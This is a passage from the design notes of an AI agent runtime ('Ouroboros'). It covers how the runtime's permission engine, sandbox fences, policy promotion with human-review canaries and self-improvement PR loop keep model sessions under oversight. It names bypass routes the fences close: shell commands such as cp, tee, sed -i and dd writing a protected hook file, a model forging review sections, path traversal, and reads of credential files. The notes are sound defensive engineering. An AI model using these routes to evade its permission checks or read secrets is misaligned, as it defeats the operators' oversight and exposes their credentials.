  sandboxed `bash` `cat` of the seed (under the data directory *and* in a directory of the
  daemon user's own), of `gateway.token` and of `web.secret` is `Operation not permitted` and
  leaks no bytes, a write to the seed fails and leaves it unchanged, and an ordinary file
  beside them still reads.
- `export_test.exs`, after the review — a re-export after a rename leaves exactly one bundle,
  names the one it removed, and leaves `README.md` and no staging directory behind; `--out`
  is refused for the reviewer's `../../../` traversal, for a sibling whose name merely starts
  with the root's, and for a symlink pointing out of the repository, while a symlink pointing
  in is accepted; the mix task refuses while a live pid holds the data directory, by
  `gateway.json` or by `runtime.owner`, and lets a stale marker through to the `--out` fence;
  a signer this node's trust policy does not carry, and a manifest with no signature at all,
  are refusals that write nothing.
- `posture_test.exs` — every refusal in §2, one test each, and the two settings the posture
  will not run under.
- `runtime_config_test.exs` — `config/runtime.exs` itself, through `Config.Reader.read!/2`: the
  posture configures in `:dev` as well as `:prod`, closes `allow_unsigned` where
  `config/config.exs` leaves it open, and raises on each missing input; and a production node
  keeps the promotion record on a synced `DurableFile` beside its grants.

**What was run live, once, on one machine.** `ouro wasm keygen --id one-machine`, then a
runtime booted under `OUROBOROS_POSTURE=self` with the three variables it printed and a scratch
data directory. That boot started `Ouroboros.Upgrade.Signing.Service` on a `:core` node and it
answered as `one-machine` with the public key `keygen` had printed; `Ouroboros.Self.Boot` was a
child of the lane-W runtime supervisor and reported nothing to ship. A second run then signed
`no-network-shell` through that service, deployed it live through the node's own rollout into
the node's own store and register, promoted `read` on the node's own record, and exported the
three files. A **third** run, on a different data directory — an empty register, an empty store
and an empty promotion record — deployed the exported bundle live, promoted `read` under the
actor `shipped:37fe1b64…`, and on a second `ship/1` deployed nothing and promoted nothing.
Removing `OUROBOROS_UPGRADE_TRUSTED_SIGNERS` refuses the boot with the variable's name.

**What is not proved.** No model session has forged the policy that gets exported: the component
is the guest SDK's `no-network-shell`, which is a real signed component and not something a
model wrote. The three live runs above were three virtual machines with three data directories
on **one host**, not three hosts, and none of them was started by `ouro --dev daemon` — the
posture was given to `mix run` with the same environment the launcher exports, including
`OUROBOROS_PROCESS_ID_HELPER`. `make self-export` against a running daemon's data directory has
not been run — its refusal is proved by a unit test that plants a live pid in the marker, not by
a daemon — and no export has been committed by the outer loop's pull request. `mix dialyzer`
and the full suite are the integrator's gates and not this section's claim.

The read fence (S-D49) is proved by a test on **Seatbelt only**. The bubblewrap form was
measured once by hand — `bwrap` 0.8.0 in a privileged `debian:bookworm-slim` container, the
argv this module emits, typed out rather than generated by it — which is what established both
that the mask works and that binding it onto an absent path refuses the command; the Elixir
side of that is an argv assertion. No Linux host has run a session through this module from
this worktree; CI's ubuntu-24.04 job is where that claim gets made. `ouro-sandbox` claims
nothing: it reports `hides_files?: false` and the posture refuses to hold a key there. That
`false` reaching `capabilities.preview` through `detect/0`'s notes is likewise unverified here
— this machine's backend is Seatbelt, so no `ouro-sandbox` detection was built.

## 4. Decisions

Numbered `S-D<n>`; each slice appends its own under its marker and never renumbers another's.

<!-- S0-decisions -->

**S-D1. The corpus stores pins, not tests.** `task.json` holds shas and paths; hidden test
content comes from `git show <commit_sha>:<path>` at run time. A copy in the corpus is a
thing that can be edited without the history noticing, and the grader additionally re-derives
the hidden set from git and refuses a `task.json` that disagrees.

**S-D2. The hidden set is every path under `test/` the commit touched**, deletions excluded,
`test/support/**` included — a commit whose fixture and test moved together is only gradable
with both. Only the `_test.exs` members are handed to ExUnit; a task naming none of them is
`setup_failed` rather than a whole-suite run.

**S-D3. The modified-test check reads the working tree against `base_sha`,** not only
`git status`. The plan named `git status --porcelain -- test/`; that misses an agent that
commits its edit. Both run, and either one firing is `modified_tests`.

**S-D4. The instruction states the rules.** It carries the subject, the body with trailers
and any pasted diff removed, an acceptance list of the `test "…"` titles the commit *adds*
(at most twelve, never a body), and a paragraph saying that pre-existing tests must not be
modified and that new ones are allowed. Saying it does not help an agent game the grade —
the grader enforces it either way — and not saying it would be measuring a rule nobody was
told.

**S-D5. `--spend` is required, an unpriced model is refused, and the cap is checked between
tasks.** One task can therefore overshoot by its own cost; that is stated in the README and
here rather than hidden, because `ouro run` has no cost flag and the runtime reports cost
only when a turn ends.

**S-D6. The oracle answers with `write`, one call per changed non-test file.** The plan said
`apply_patch`. `Tools.Write` has no read-before-write guard, whole-file content at
`commit_sha` is exact, and a generated V4A patch would be a second thing that can be wrong.
What the oracle proves is the grader, not a patch format. The cost is a corpus rule: a task
whose changed files exceed `--max-solution-bytes` is dropped, because the scripted model caps
a script file at 1 MiB.

**S-D7. Two negative controls, behind a seam refused outside `--oracle`.**
`--oracle-cheat no-solution` and `--oracle-cheat blank-tests` (with `--fake-cost-usd` for the
budget) turn the plan's "mutations that must go red" into assertions `selftest.sh` runs every
time, rather than something a reviewer re-derives. Each is refused with `--spend` alone.

**S-D8. Three candidate filters the plan did not name.** A commit that changes `mix.exs` or
`mix.lock` is dropped, because the `deps/` and `_build/` cloned into a worktree were built
for a different lock (the runner still runs `mix deps.get` when a task's lock differs, so the
history's older locks are reachable — but a commit that *changes* the lock is not a coding
task, it is a build change). A commit whose non-test diff deletes a file is dropped, because
`write` cannot express a removal. `bench/` joins the excluded trees, so no task in this
corpus is a task about this corpus.

**S-D9. A child's environment is a delta, and a removal is `{name, false}`.**
`:erlang.open_port`'s `env` option *extends* the caller's environment: a variable left out of
the list is still inherited. `Bench.Self.Env.build/2` therefore emits removals explicitly.
The oracle's claim that it runs with no provider key in the environment depends on this and
would otherwise be false. `bench/local/run.exs` builds its environment the other way and its
`@dropped` list removes nothing; nothing is spent there because the scripted model never
makes a request, but the guarantee its README states is not the one the code provides.

<!-- S1-decisions -->

**S-D10. The tool exists only under a switch, and the switch is read as exactly `true`.**
`config :ouroboros, :native_forge_tool` gates both the spec list and `Tools.lookup/3`, the
way `Native.Desktop.enabled?/0` gates the Computer Use tools and a live rollout gates
`capability` (docs/WASM.md D9). A name a model is taught and cannot use costs a call to
discover. `== true` rather than truthiness, because the misconfigured reading of a switch
that widens what a session may do is the one that leaves it shut.

**S-D11. `author` is the session, added by the loop, and is not reachable from the model.**
The proposal took the author from "the principal the permission engine receives"; the tool
context carried no identity at all, so the loop's `execute/2` context map gains one key,
`principal: principal(state)` — the same `"session:<id>"` string the loop already derived for
the effect ledger. `author` is not in the tool's schema, so the loop's own `validate_call/3`
refuses an argument by that name against the advertised JSON Schema and `Tools.atomize/2`
would drop it anyway; the tool never reads a parameter of that name under any spelling. A
context whose principal is absent, is not a binary, or is the loop's anonymous `"native"` is
a refusal rather than a fallback: `"native"` is every unidentified session at once, and
`deploy` compares authors, so signing under it would be one session able to deploy another's
bytes.

**S-D12. `name` is a parameter, checked on exact bytes, and made honest downstream.**
`Capability(<name>)` is honest because the name is resolved against the live register before
the engine is asked. A capability being forged has no register entry, so there is nothing to
resolve. What makes `Forge(<name>)` honest instead is that the *same bytes* the engine was
shown are handed to `Ouroboros.Wasm.Forge`, which refuses a `Cargo.toml` whose package is
called anything else — and to the `manifest.json` check, which refuses a proposal that names
a third thing. Nothing trims, strips or folds, on either side of the seam (the F1 rule from
`Tools.Capability.resolve/1`).

*The same bytes* means the two seams have to read the arguments the same way, and they used
not to: the classifier read a string key first and the tool an atom key first, so a map
carrying both spellings was judged as one operation and executed as another. There is now one
reader — `Tools.Forge`'s own `param/2`, string key first — and `Tools.classify/3` calls it
through `Forge.request_context/1` rather than reading the input itself. And what
`Permissions.suggest/1` offers for a forge is held to the same charset a `Forge(<name>)`
pattern parses, restated locally as `Pattern` restates it: a suggestion is a rule an operator
is about to persist, and offering one `Pattern.parse/1` refuses would save a dead rule under
a decision somebody thought they made.

**S-D13. What each operation puts in front of the engine, and what it declares.** Three
different answers, and each is a fact somebody can check.

`preview` and `forge` carry `%{forge: name}` — the `name` parameter, exact bytes, when
`Wasm.Artifact.name?/1` accepts it — and additionally **declare the resolved project
directory** in the request's `paths`. Declaring nothing was a hole: `Deny Read(<ws>/secret/**)`
said nothing about a forge pointed at `secret`, because the engine had no path to match. The
`Read(…)` pattern therefore covers a `forge` request as well as a `mode: :read` one — but
only under a **deny or ask** rule (`Matcher`'s quantifier is `:any` for exactly those two).
`Allow Read(**)` is a sentence about reading; a forge builds and signs something this node
will run, and the only rules that allow one are `Forge(<name>)` and `Forge(*)`.

`deploy` carries `%{forge: name}` too, and the name is the one the **artifact id actually
resolves to**: `Tools.classify/3` reads the bundle out of this node's forged ring, decodes
it, and verifies its signed manifest against this node's trust policy the way
`Ouroboros.Wasm.PolicyEngine` verifies one before loading a byte — the kind must be
`:capability` — before any name reaches the engine. So `Forge(vet)` covers deploying `vet`,
which is the sentence somebody answering that prompt meant. The earlier reading, that a
deploy could only ever be denied or asked, made a `Forge(…)` allow unable to cover the second
half of the thing it allowed. What it protected against instead — an unverified file naming
itself into a decision — is answered by the verification rather than by silence. The tool
then re-reads the same bundle, re-verifies it, and refuses unless the kind is `:capability`,
the author is this session, and the name is still the one the decision was about (the loop
hands that back as `forge_evaluated_name`, the way it hands `desktop_evaluated_app` to the
desktop tools). A bundle swapped at that id between the decision and the deploy is refused by
name.

`status` carries nothing and declares nothing. It names nothing and builds nothing.

**And a forge reads a directory before it judges it — so it judges the names first.**
`Wasm.Forge`'s walk now checks a file against C9's allow-list *by name* before opening it, so
a `preview` of a directory that is not a project refuses `secrets/id_rsa` without reading it.
The refusal still names the file, because the directory belongs to whoever pointed the forge
at it and "which file was wrong" is the answer they need.

**S-D14. `Tool(forge)` is deny-and-ask only.** `Pattern.decisions/1`'s second
`:deny_or_ask_only`, by `Tool(capability)`'s argument one step earlier: an allow on the tool
is an allow to add *any* capability to this runtime, under any name, now and later. Narrowing
stays available because narrowing is always honest, and `Forge(*)` is how the broad thing is
said out loud.

**S-D15. Every operation is an execute, `preview` and `status` included.** A `preview` runs a
real cargo build inside the OS sandbox — that is the point of it — and classifying it as a
read would be plan mode permitting a compile. `status` reads bundles this node signed. There
is no read half of this tool.

**S-D16. The ledger is the gate, not the log.** `EffectLedger.record_started` writes the
`:forge` or `:deploy` entry under the session principal *before* the effect and settles it
after, mirroring `Ouroboros.Agent.Effects.Runner`; a ledger that cannot record refuses the
operation rather than proceeding unrecorded. Bytes never enter it: a `:forge` attempt names
`wasm/<name>` and its result names the artifact id, module, epoch, signer, source digest and
nodes — the fields the runner already writes. `preview` has no entry of its own, because
`Ouroboros.Agent.EffectLedger` has no kind for one and that file belongs to another slice;
what accounts for a preview is the `:tool_call` entry every tool call has.

**And an entry that is `:started` is never left to nobody.** Three ways the settle could not
run, each closed by a different mechanism, all of them `Effects.Runner`'s: the body **raises
or throws**, and the entry is settled `:failed` with the class before the reason is re-raised
into `run/2`'s own handler; the tool task is **brutally killed**, which `Tools.execute/4` does
at the loop's timeout and which runs no line of this module at all, so the ledger is asked to
`watch_runner/3` the task process before the effect starts and a monitor firing on a
`:started` entry settles it `:ambiguous` — the honest word for "a build may have happened and
nobody knows"; or it returns, and the two branches settle it themselves. A `watch_runner/3`
that fails is logged and not a refusal, unlike in `Effects.Runner`: the entry is already
durable and the effect already accounted for, and stopping a forge the ledger *did* record
because a monitor could not be attached would trade the capability for bookkeeping.

The loop's tool timeout for `forge` is `max(tool_timeout_ms, Forge.max_timeout_ms/0)`, and
that ceiling is now the sum of the deadlines something else actually enforces:
`Wasm.Forge.build_timeout/1`, `:signing_call_timeout`, `:capability_eval_timeout`, and the
rollout's `stage`, `probe` and `start` per-node deadlines, plus 30 s of margin. One number
for four operations, because the loop's table is on the tool name: a `forge` spends the first
two terms and a `deploy` the rest.

**S-D17. `authority` is a class; `cause` is the link, and the link does not depend on
audit.** A tool is handed `scope`, `principal` and no permission decision, so these entries
say `%{decision: :granted, reason: :native_tool_call}` — an honest statement that the loop
admitted the call — and never a rule id this module did not see. The chain to the decision is
two hops, each written by whatever knew the fact: this entry's `cause.signal_id` is the
`:tool_call` ledger entry for the call, whose `attempt.permission_entry_id` names the
`:permission` entry.

The first hop used to be read out of the *audit* context, so it existed only on a node whose
audit stream was on — while the `:tool_call` entry it names is written on every admitted call
regardless. The loop now puts `ledger_effect_id` on the tool context plainly, beside
`principal`; the audit fields remain a fallback for a caller that assembles a context the old
way. Under the default `:standard` audit mode both hops are walkable, which is what
`test/provider/native/forge_tool_test.exs` walks.

**S-D18. One proposal format, one validator.** A project directory's `manifest.json` — the
same file `Ouroboros.Runtime.Capabilities` reads for an operator's `capabilities.admit` —
supplies the description, the evaluation spec and `start.config`, and the `eval` and
`start_config` parameters override it. Both go through `Runtime.Capabilities`' own functions
(`wasm_manifest/1`, `wasm_eval/1`, `wasm_start_config/1`, extracted for this), so the
operator's file and the model's parameter cannot come to disagree about what an evaluation
spec is. The `name` is always the parameter, and a manifest naming something else is refused
before the forge.

**S-D19. `ouroboros.toml` is refused by the permission engine *and* by the OS sandbox, and
where the sandbox cannot refuse it the workspace is not trusted.** Three parts, because a
rule the shell walks around is not a fence.

*The engine.* `Rules.protected_write?/1` refuses any path whose final component is
`ouroboros.toml`, case-folded for `.git`'s reason, at every depth — the workspace hook
manifest `Ouroboros.Provider.Native.Hooks` reads to decide which programs run around a tool
call. Final component rather than segment, so a directory by that name is not it. The
worktree-delivery exemption is unchanged.

*The kernel.* The engine only ever sees the paths a call **declares**, and a `bash` call
declares its redirect targets and nothing else: `cp template ouroboros.toml`, `mv`, `tee`,
`sed -i`, `dd` and `python3 -c` all reached the file with the engine's rule in place. So the
sandbox policy grew a third fence beside `protected` (roots) and `protected_segments`
(directory names): `protected_files`, concrete paths denied whether or not they exist, one
per writable root — `Sandbox.protected_files/2`. Seatbelt writes one
`(deny file-write* (literal (param …)))`, which matches a path the kernel resolves whether or
not a file is there; bubblewrap binds the file read-only over itself when it exists and binds
`/dev/null` read-only onto it when it does not, so the destination is present, read-only and
busy. Proved live on this machine: a sandboxed `Tools.Bash.run/2` doing
`cp template ouroboros.toml` exits non-zero and the file does not exist afterwards, with
`.git/pwned` as the control.

*And where it cannot.* `ouro-sandbox` cannot express it — Landlock attaches rights to inodes,
so a path that need not exist cannot carry a rule, and the `LD_PRELOAD` name filter that
carries the equivalent `.git` case is a libc filter a static binary walks past. It reports
`Sandbox.protects_files?/1` as `false` rather than pretending, and `Hooks.trusted?/2` then
answers `false` for every workspace on that node: the workspace's **shell** hooks and checks
are declined and counted exactly as an untrusted workspace's are, with one warning naming the
backend. Component hooks are unaffected — they run in the WebAssembly pool, can only narrow a
decision, and are admitted from an untrusted workspace already (D8). Trusting a file the
session can rewrite is trusting whatever it writes next; a node that cannot hold that one
path shut does not get to call a workspace trusted.


<!-- S2-decisions -->

**S-D20. The corpus is written at `Control.Permissions.record/2`, for answers that say a human
made them, and nowhere else.** Every seam that asks a human — the native loop, the interactive
plane's external approvals, the interactive shell, the ACP seam — records the answer through
that one function, so writing there is what makes the corpus complete without four call sites
agreeing to be correct. The native loop passed no request at all before this (plan §0 row 2);
its four human-answer sites now pass `request: permission_request(state, classified)` and the
other eleven `record/6` call sites are unchanged. A row is written even when the ledger refused
the entry, with `permission_entry_id` left `nil` rather than naming an entry that does not
exist.

The actor is **required and has no default**. `PolicyEvidence.write/3` read
`Map.get(answer, :actor, :human)`, and the seams above it were worse than that: the interactive
plane derived the actor from the *source*, which `respond_external/3` hard-coded to `:human`,
and the native loop had no way to know at all because `Jido.Harness.ApprovalResponse` has no
actor field. So `ouro run --approve-all` — which declares `actor: "headless"` on the wire, and
whose `:approval` ledger entry has always said so — wrote human decisions into the corpus a
promotion is measured against. `Control.Permissions`' answer type now admits `:automation` (a
client that answered with nobody at the keyboard) and `:runtime` (this node answering its own
unanswered question: a timeout, a caller that went away); the gateway carries a declared
non-human actor to the native loop in `provider_options`, the one slot the harness struct has
that survives the trip; and none of the four is evidence.

**S-D21. `replayed_at` is outside `report_sha256`.** The plan says the digest covers "everything
else"; taken literally that includes the timestamp, and two replays of one corpus would then
produce two digests, which is the opposite of what `promote/5` asks the digest. The digest
covers everything except itself and `replayed_at`, contradiction rows are sorted, and both
determinism and order-independence are tests.

**S-D22. One policy, one sha, per record — and the sha is checked again at the moment of the
`allow`.** A promotion is a measurement of one component's judgement against decisions humans
made. A re-deploy under the same name is different bytes that have measured nothing, so
`PolicyPromotion.allowable_shapes/4` requires the record's sha to equal the bytes about to
answer before it returns a single earned shape. Without it, widening a policy would be a
one-time cost that every later version of it inherits. Both gates — the name and the bytes —
live in that one function, because the first version split them across a caller and the record
and a caller could then ask "which tools has `name` earned" with the bytes left out of the
question.

Un-configuring a promoted policy does not turn it off: `configured_policy/0` falls back to the
record, deliberately (a node whose policy vanished because a config key was edited would be a
node whose permission surface moved silently). `PolicyEngine.status/0` says which of the two the
name came from, and `PolicyPromotion.clear/1` is the way off.

**S-D23. A dry evaluation stands its own instance and records nothing.** `wasm/policy/dry/<sha>`
rather than the live `wasm/policy/<sha>`: a replay of ten thousand requests must not be able to
touch the state of the component deciding this node's live permissions. It writes no
`:permission` entry and no evidence row, because a ledger full of decisions nobody made is worse
than no ledger. A verdict outside the grammar is an *error* on this path rather than the `ask`
the live path reads it as — a replay counting malformed answers as good behaviour would promote
on them, and S-D28 makes that a gate rather than only a number. The instance is put down when
the ask is over unless the caller passes `keep: true`; `replay/2` is the caller that does, and
drops it once at the end.

**S-D24. One human contradiction demotes — and shadow sampling is what lets one be seen.** Not
a vote and not a ratio: the threshold a promotion cleared was *zero* contradictions, so a single
one is the evidence for that promotion being false, and re-earning it is a replay away. Every
shape that covered the request is demoted, because two shapes can cover one call and demoting
one would leave it resolvable.

The uncomfortable half the review found: the canary's trigger is a human `deny`, and a human is
only asked when the engine answered `ask` — so for a promoted shape, the one contradiction the
canary exists to catch was the one it could never be shown. S-D29's sample is the answer, and
with `config :ouroboros, :policy_shadow_every` set to `0` the canary is blind inside a promoted
shape and this decision is worth nothing. The canary is bounded, total, cannot change the answer
it runs beside, and its dry ask runs in a process of its own so a wedged helper costs the
demotion its latency rather than the human's answer.

**S-D25. The ledger sits on opposite sides of a widening and a narrowing.** A promotion writes
its `:policy_promotion` entry *before* it checkpoints, and a ledger that refuses refuses the
promotion — `record_started` there, settled `:ok` after the checkpoint is acknowledged and
`:failed` when it is refused, which is `Effects.Runner`'s discipline and the reason a promotion
the storage rejected no longer leaves a settled entry saying it happened. A checkpoint whose
outcome is unknown leaves the entry `:started`, this ledger's own word for ambiguity. A demotion
and a `clear` write theirs *after*, and a ledger that refuses is logged rather than obeyed. This is `Control.Permissions`' own rule for an unrecordable answer: an allow
nobody can account for has not been granted, but refusing without an audit entry is still
refusing. The plan's blanket "a ledger that refuses refuses the write" would have made a broken
audit trail into a permission surface nobody could narrow.

**S-D26. A promotion must be worth making, and `would_resolve` is the gate that says so.** The
first version of this decision said the opposite — that `decisions >= 50` and
`contradictions == 0` were the whole of it, that a component which answers `ask` to everything
was therefore promotable, and that adding `would_resolve` as a gate would be inventing a
threshold the plan did not set. The review proved what that costs: a component that abstained on
every row of the corpus cleared the floor having demonstrated nothing, and the right it was
granted was precisely the right to say `allow` and be believed. `would_resolve >= 1` is now one
of the five numbers in S-D28, and the report still prints all of them so an operator can see how
much a promotion buys before making it.

**S-D27. What is promoted is a shape, not a tool.** A shape is a `bash` command prefix — the
first token or the first two tokens of a sub-command — and a promoted shape covers a request
when **every** sub-command matches `Bash(<shape> *)` under `Control.Permissions.Matcher`'s
word-prefix semantics with the allow quantifier, which is the reading an operator's own allow
rule gets. `Shell.split/1` and `normalize/1` do the tokenizing: a promotion has to mean the same
thing a rule means, and a second tokenizer would be a second answer to "what is this command
line". A truncated command line is covered by nothing, for `Rules`' own reason — an unchecked
65th sub-command must not ride a shape that only ever saw 64.

`bash` is the only promotable tool in v1 and every other tool is refused as
`{:tool_not_promotable, tool}`. A `read` promotion would be per path glob and a `web_fetch` one
per domain; both are real and neither is this slice, and refusing them by name is better than a
shape language that quietly means nothing for them.

Shapes are drawn from the corpus row's **redacted** document, the exact bytes the component was
shown. A command whose first two tokens were credential-shaped therefore yields a shape no live
request can match — narrow, and the only honest reading of a corpus that never held the
unredacted line.

**S-D28. The thresholds count definite verdicts, distinct requests and distinct sessions.** Five
numbers, and each replaced one the review proved carried no information:

| gate | why |
|---|---|
| `contradictions == 0` for the whole tool | a component more permissive than a human anywhere in a tool is not promotable for any part of it |
| `unreadable == 0` on the shape's rows | S-D23's rule made a gate, so a component cannot duck a contradiction by answering outside the grammar |
| `distinct_fingerprints >= 20`, definite verdicts only | `decisions` counted `ask`s, and it counted rows: fifty copies of one approved `mix test` cleared it |
| `distinct_sessions >= 2` | one session's worth of answers is one person's afternoon |
| `would_resolve >= 1` | a promotion that removes no prompt is a widening bought for nothing |

`promotion_thresholds/0` is the list and `replay/2` prints it in every report beside the numbers
it measured, so an operator reading one file can see why a shape is or is not promotable.

**S-D29. Every tenth honoured allow is put to a human anyway.** `config :ouroboros,
:policy_shadow_every`, default 10, counted per `(tool, shape)` in the promotion record's own
non-durable state. Within a promoted shape the Nth honoured `allow` is downgraded to
`{:ask, :policy_shadow}`; a human answers it, that answer is evidence like any other, and a
human `deny` there is a contradiction the canary demotes on.

This is not a safety margin. It is what makes the canary **able to see**: a promoted shape
otherwise resolves its calls with nobody in the loop, so nobody is ever asked about the calls
the promotion removed and no contradiction can ever be observed — the promotion becomes
irreversible in practice while looking reversible on paper. The cost is a tenth of the prompts a
promotion removed, which is the price of knowing it is still right. `0` disables sampling, is
honoured because an operator may have a reason, and is documented here and in S-D24 as blinding
the canary.

**S-D27. The actor is the gateway principal, and an unattributed caller is refused rather than
recorded.** `policy.promote` and `policy.clear` have no `actor` parameter: who promoted is the
identity the connection authenticated as, read by `Audit.Identity.actor/0` from the runtime's
own side of the socket, because a promotion whose actor a client could type is a promotion with
anybody's name on it. That function cannot fail — with no resolvable subject it answers the
placeholder `runtime-unattributed`, which is a fine ledger principal for something the runtime
did to itself and is not a human — so both verbs check for it and answer `-32003` with
`reason: unattributed_actor`. `policy.demote` does **not**: narrowing is safe, `PolicyPromotion`
requires no actor for it, and a demotion nobody can name is still a demotion. The check runs
before the plane is asked, so an unattributed caller does not learn which policies this node
runs.

**S-D28. Four of the five verbs answer the same object.** `status`, `promote`, `demote` and
`clear` all answer the record as it stands after the call, so a client has one shape to render
and every write proves itself by handing back what the record now says rather than by an
acknowledgement a caller has to trust. It is bounded in the three places it could grow: the
demotions are the newest twenty of the two hundred the record keeps, the evidence is
`PolicyEvidence.count/0`, and the tools are the record's own map. `demote` adds exactly one key,
`reason`, which is the sentence the operator typed **echoed** — the record stores the enumerated
term `:operator_demotion` instead, because a checkpoint fsynced on every write is not where free
text belongs, and the CLI puts the echo on stderr for the same reason.

**S-D29. None of the five takes a `node`, and `policy.replay` is `:operate`.** The promotion
record is a checkpoint on this machine and the corpus is a file on it, so there is nothing to
route to; a client asks the machine that made the decisions. `replay` is `:operate` rather than
`:read` for the reason `computer_use.probe` is — it stands a component up — even though it
decides nothing, records nothing and never touches the live instance. `promote` additionally
admits `outcome: :unknown`, the admission `wasm.deploy` makes: the replay it re-runs and the
checkpoint it writes do not stop because a socket's ceiling fired, and a client reconciles with
`policy.status` rather than by retrying blind.

<!-- S3-decisions -->

**S-D30. Gate 1 records, gate 2 decides.** A red gate after the implementer stops nothing:
the review and the fix wave exist to answer it, and a body that shows gate 1 red and gate 2
green shows the loop working. A red gate after the fix wave stops the script before the
commit, so nothing reaches a branch that the gates did not pass. Both rc lines go in the
pull request body.

**S-D31. Every gate carries `mix compile --warnings-as-errors`, and a diff with no test
files does not get a free pass.** `mix test` with no arguments is the whole suite, which is
minutes and is not this gate; a diff that touches no `test/**/*_test.exs` therefore skips
the suite, and says so in its rc line and in the body. Compiling under
`--warnings-as-errors` is what keeps that skip from being a hole. Without `--quick`,
`make test` and `mix dialyzer` run too and the body says which of the two shapes it got.

**S-D32. Diffs are taken against the sha the worktree was branched from, recorded once, and
not against `dev`.** The plan says `git diff dev...HEAD`; a run is an hour and `dev` moves.
Pinning `base_sha` at worktree creation makes the gate, the review, the scan and the body
all describe the same change. `git add -A -N` runs before every diff, or a whole new module
the session created is invisible to all four.

**S-D33. The commit is the loop's, and it carries the loop's paperwork nowhere.**
`REVIEW.md` and `PR_BODY.md` are evidence about the change rather than the change, so
`git add` excludes both by pathspec and leaves them in the worktree beside the commit. The
loop's commit always carries the task title as its subject and
`Co-Authored-By: Ouroboros native session <id>` as its trailer — so a session that
committed its own work, which the implementer brief tells it not to do, is refused at the
commit step with a message naming the branch and the recovery, rather than papered over
with an empty commit or an amend. That refusal is distinct from "the sessions changed
nothing", because the two mean opposite things.

**S-D34. The review is fenced, and the body checks itself before anything is pushed.** The
review is the only model-written text in the pull request body; unfenced, a model that
wrote `## Human review required` in its own review would be writing our sections for us.
The fence is six backticks and any line that could close it early is replaced. The task,
which a human wrote, is embedded verbatim. The protected-namespace section is then asserted
by the body writer on every run — `--no-pr` included, so the assertion is exercised whether
or not a pull request follows — and again immediately before `gh pr create`. A body without
it stops the run. This is the one refusal in the loop that has nothing to do with whether
the change is good.

**S-D35. The corpus runs once, as the *after* number.** The plan asks the body for a
before/after delta; running the corpus twice doubles a real spend, so the *before* comes
from `BENCH_SELF_BASELINE`, a path to an earlier `bench/self` `result.json`. With no
baseline the body says `before: not run` and names the variable rather than inventing a
number to subtract from.

**S-D36. The script never edits a git remote.** If `origin` pushes over SSH the script says
so before it tries, and if the push fails it names `--no-pr` and says the commit is still on
the branch. Which URL a checkout pushes over is the operator's decision; a script that
rewrote it would be changing the operator's repository to suit itself.

**S-D37. The test shim is a committed, labelled file under `bench/self/lib/improve/`, and it
fails loudly on any flag it does not know.** A selftest whose stand-in silently ignored an
argument would go green on a script that passes the real client something it would reject.
`improve.sh` knows nothing about the shim: the shim recognises its role from a
`OUROBOROS-IMPROVE-ROLE:` line the prompts carry anyway, and remembers the workspace of a
session it started in its own state directory, because `--resume` conflicts with
`--workspace` in the real client.

**S-D38. `--dry-run` walks the whole script and executes nothing, including the client
resolution's failure.** Asked what it would do on a checkout with no built client, it names
the path it would have taken and says the path is not there, rather than refusing to answer.

**S-D39. Two environment variables exist for the selftest and are documented for everyone.**
`OUROBOROS_IMPROVE_WORKTREES` moves the worktree out of `.claude/worktrees`, and
`OUROBOROS_IMPROVE_RUN_DIR` moves the daemon data dir and the logs out of a fresh
`mktemp -d`. The selftest needs both to keep its worktrees and logs inside its own scratch;
making them ordinary documented knobs is cheaper than a test-only code path in the script.

<!-- S4-decisions -->

**S-D40. The posture is a pure function, and `config/runtime.exs` only calls it.** Every input
the `self` arm reads is a refusal waiting to happen, and a refusal written inside a config file
can only be tested by booting a virtual machine per case. `Ouroboros.Self.Posture.configure/2`
takes the environment as a map and this build's two relevant settings as a keyword list, and
answers `:off`, `{:ok, keywords}` or `{:error, sentence}`. It is the second module a config
provider calls after `Ouroboros.DataDir` and it earns that the same way: no application
environment, no process, no other module of this application. The two settings are arguments
rather than reads so the function stays pure — and so a test can weaken one without touching
the node.

**S-D41. An unrecognised `OUROBOROS_POSTURE` refuses the boot rather than being ignored.** A
node running a posture nobody named is a node whose fences nobody chose, and the operator who
typed `OUROBOROS_POSTURE=fleet` believes something about what is running. `Self` and `SELF` are
refusals; a trailing space or newline is not, because that is a shell expanding a variable and
not an operator meaning something else.

**S-D42. The export ships what is running, not what is remembered.** The promotion record names
a policy and a sha; the register says what this node is actually running. The export requires
both to agree — a `:live` entry under that name at that sha — and refuses otherwise. A record
whose policy was rolled back is a record about bytes nobody consults, and shipping it would put
a widening in a repository for a component the receiving node would then deploy on the strength
of the record that came with it.

**S-D43. A demoted tool is not shipped.** The export writes `status.allowable_tools` — promoted
and not demoted since — and not `status.tools`. A demotion is the durable statement that a human
contradicted this component on this machine; shipping the promotion it withdrew would re-widen
somewhere else exactly what was narrowed here, and the receiving operator would have no way to
see that it had ever been narrowed.

**S-D44. A shipped promotion goes through the ordinary API, with an actor that is not a
person.** `Ouroboros.Self.Boot` calls `PolicyPromotion.promote/6` like `ouro policy promote`
does, so a shipped widening is validated, checkpointed and ledgered exactly as a human's is. Its
actor is `shipped:<sha256 of promotions.json>`. Inventing a person there would be a lie in the
audit trail, and `"shipped"` alone would not say *which* file: the digest is what makes the
entry traceable to bytes a reviewer can read.

**S-D45. Promotions are applied over an empty record and never merged.** Two records mean two
answers to "which human promoted this", and there is no honest way to combine them. A node that
has promoted anything of its own keeps its own; the shipped record is reported as skipped, by
name, and an operator who wants it clears theirs first — deliberately, which is what
`PolicyPromotion.clear/2` is for.

**S-D46. The boot decides on the register before it verifies, and skips either way.** A bundle
claiming a name this node already runs is skipped whether or not it would have verified. That is
the safe direction for a claim nothing has checked yet, and it is what makes the second boot a
no-op without re-verifying and re-deploying bytes that are already live.

**S-D47. `Ouroboros.Self.Boot` deploys through `Wasm.Rollout.deploy/4` rather than through
`Wasm.Deploy.deploy/3`.** The plan named the latter; it takes an **upload id** and its body is
`Ouroboros.Wasm.Upload.take/2` followed by exactly the `Bundle.decode/1` and
`Rollout.deploy/4` this module calls. Reaching it from a boot task would mean chunking a file
already on disk through the gateway's 512 KiB upload slots — of which a node holds eight — to
produce bytes it already has. Every verification is unchanged: the rollout is where a bundle is
verified against this node's trust policy, before its checkpoint and again on every target
(`Ouroboros.Wasm.Deploy`'s own moduledoc says so, and says why there is no second check).

**S-D48. A production node keeps S2's promotion record on a synced durable file.** S2a shipped
`:policy_promotion_storage` with an ETS default, which is right for a laptop and wrong for the
node an operator promoted a tool on: without a line in `config/runtime.exs`' production block,
every promotion was forgotten at restart. It is now a `DurableFile` under the data directory
beside `:grants_storage`, and held to the same rule — an acknowledged promotion must survive the
crash that follows it, and so must the demotion that withdrew it.

**S-D49. The sandbox hides this node's own credentials from a read, and a node that cannot do
